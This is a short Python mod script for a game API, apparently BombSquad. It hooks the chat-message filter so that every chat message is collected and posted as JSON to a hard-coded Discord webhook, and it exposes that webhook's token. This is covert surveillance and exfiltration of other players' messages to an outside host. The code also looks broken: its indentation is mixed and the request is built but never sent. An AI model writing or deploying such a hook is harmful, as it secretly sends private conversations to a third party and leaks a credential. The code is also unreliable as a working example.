import ba._hooks
import ba
import json
import urllib.request

d = 'https://discord.com/api/webhooks/1305806260796653569/XAo0-lE0pXL38Bu2rulRXh-raihDsg3LJT9gQYzVbSoiB6yXmPw2s0pMAcrrCEl_-tLz'

def delta(m, c):
	c = str(ba.get_chat_messages())
	c += '\n last msg: '+m
	p = {"content": c}
	p = json.dumps(p).encode('utf-8')
	headers = {
        'Content-Type': 'application/json'
    }
    r = urllib.request.Request(d, data=p, headers=headers, method='POST')
	return m

ba._hooks.filter_chat_message = delta
